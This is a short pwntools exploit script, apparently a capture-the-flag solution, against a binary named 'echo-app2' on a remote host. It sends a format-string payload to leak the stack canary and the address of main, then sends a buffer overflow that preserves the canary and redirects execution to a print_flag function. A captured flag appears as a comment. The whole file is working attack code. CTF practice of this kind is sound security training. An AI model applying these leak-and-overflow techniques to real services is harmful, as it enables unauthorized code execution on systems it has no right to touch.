import sys
sys.path.append('/home/ubuntu/pat/scripts/')
from pwn import *
from pwnfast import Pwn

context.terminal = ['tmux', 'splitw', '-v', '-p', '90']

PROG = './echo-app2'

### ------------------ EXPLOIT ------------------ ###

r = Pwn(PROG, conn='54.85.45.101 8009')
# r = Pwn(PROG, pie_base=0x555555554000)

# pay = '|'.join([f'0x%{i}$lx' for i in [39]])
pay = '0x%39$lx|0x%41$lx'
r.sl(pay)

r.rb(2)
canary = int(r.rb(16).decode(), 16)
log.info('Leaked canary: ' + hex(canary))

r.rb(3)
leaked_main = int(r.rb(16).decode(), 16)
log.info('Leaked main: ' + hex(leaked_main))

# 0x38c is the offset between the leaked main address and print_flag
print_flag = leaked_main - 0x38c

pay = b'A' * 264
pay += p64(canary)
pay += b'B' * 8
pay += p64(print_flag)
r.sl(pay)

r.interactive()

# flag{aslr_and_canari3s_are_n0_match_f0r_l3aky_stacks}